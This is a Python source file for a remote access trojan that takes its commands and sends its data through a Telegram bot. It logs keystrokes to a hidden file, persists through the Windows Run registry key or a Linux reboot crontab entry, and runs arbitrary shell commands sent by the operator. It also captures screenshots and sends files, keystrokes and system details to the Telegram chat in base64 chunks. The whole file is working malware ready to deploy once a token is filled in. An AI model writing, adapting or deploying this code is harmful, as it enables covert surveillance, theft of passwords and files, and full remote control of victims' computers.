import requests
import subprocess
import os
import sys
import time
import platform
import socket
import base64
from io import BytesIO

BOT_TOKEN = "PUT_TOKEN"
ADMIN_ID  = "PUT_ID"
API = f"https://api.telegram.org/bot{BOT_TOKEN}"
KEYLOG_FILE = os.path.join(os.environ.get("TEMP", "/tmp"), ".syscache")

def send(text):
    try:
        requests.post(f"{API}/sendMessage", data={
            "chat_id": ADMIN_ID, "text": text[:4000],
        }, timeout=15)
    except Exception:
        pass

def send_img(data_bytes):
    try:
        b64 = base64.b64encode(data_bytes).decode()
        for i in range(0, len(b64), 3500):
            chunk = b64[i:i+3500]
            prefix = "IMG:" if i == 0 else "PART:"
            send(prefix + chunk)
    except Exception as e:
        send(f"ERR img: {e}")

def send_file(name, data_bytes):
    try:
        b64 = base64.b64encode(data_bytes).decode()
        for i in range(0, len(b64), 3500):
            chunk = b64[i:i+3500]
            prefix = "FILE:" + name + ":" if i == 0 else "PART:"
            send(prefix + chunk)
    except Exception as e:
        send(f"ERR file: {e}")

def start_keylogger():
    try:
        from pynput import keyboard
    except ImportError:
        return
    def on_press(key):
        try:
            with open(KEYLOG_FILE, "a", encoding="utf-8") as f:
                f.write(key.char if hasattr(key, "char") and key.char else f"[{key}]")
        except Exception:
            pass
    lst = keyboard.Listener(on_press=on_press)
    lst.daemon = True
    lst.start()

def persist():
    sysname = platform.system()
    try:
        if sysname == "Windows":
            import winreg
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "SysCache", 0, winreg.REG_SZ, sys.executable)
            winreg.CloseKey(key)
            return "persisted (Windows)"
        elif sysname == "Linux":
            cron = f"@reboot {sys.executable} {os.path.abspath(__file__)}\n"
            os.system(f'(crontab -l 2>/dev/null; echo "{cron}") | crontab -')
            return "persisted (Linux)"
    except Exception as e:
        return f"ERR: {e}"
    return "unsupported"

def execute(cmd):
    if cmd == "EXIT":
        os._exit(0)
    if cmd == "sysinfo":
        return (f"host: {socket.gethostname()}\n"
                f"os: {platform.platform()}\n"
                f"user: {os.getenv('USER') or os.getenv('USERNAME')}\n"
                f"cwd: {os.getcwd()}\n"
                f"pid: {os.getpid()}")
    if cmd == "screenshot":
        try:
            from PIL import ImageGrab
            img = ImageGrab.grab()
            buf = BytesIO()
            img.save(buf, format="PNG")
            send_img(buf.getvalue())
            return None
        except Exception as e:
            return f"ERR ss: {e}"
    if cmd == "keylog_dump":
        try:
            with open(KEYLOG_FILE, "r", encoding="utf-8") as f:
                return f.read()[-4000:] or "[empty]"
        except Exception as e:
            return f"ERR: {e}"
    if cmd == "keylog_clear":
        try:
            open(KEYLOG_FILE, "w").close()
            return "cleared"
        except Exception as e:
            return f"ERR: {e}"
    if cmd == "persist":
        return persist()
    if cmd.startswith("cd "):
        try:
            os.chdir(cmd[3:].strip())
            return os.getcwd()
        except Exception as e:
            return f"ERR: {e}"
    if cmd.startswith("download "):
        try:
            p = cmd[9:].strip()
            with open(p, "rb") as f:
                send_file(os.path.basename(p), f.read())
            return None
        except Exception as e:
            return f"ERR: {e}"
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, timeout=30)
        out = (r.stdout + r.stderr).decode(errors="ignore")
        return out.strip() or "[no output]"
    except subprocess.TimeoutExpired:
        return "[timeout]"
    except Exception as e:
        return f"ERR: {e}"

offset = 0
def poll():
    global offset
    while True:
        try:
            r = requests.get(f"{API}/getUpdates",
                             params={"offset": offset, "timeout": 20},
                             timeout=25).json()
            for u in r.get("result", []):
                offset = u["update_id"] + 1
                msg = u.get("message")
                if not msg: continue
                if str(msg["chat"]["id"]) != str(ADMIN_ID): continue
                cmd = msg.get("text", "").strip()
                if not cmd: continue
                result = execute(cmd)
                if result: send(result)
        except Exception:
            time.sleep(3)

def main():
    start_keylogger()
    send(f"REG:{socket.gethostname()}|{platform.system()} {platform.release()}|{os.getenv('USER') or os.getenv('USERNAME')}")
    poll()

if __name__ == "__main__":
    main()
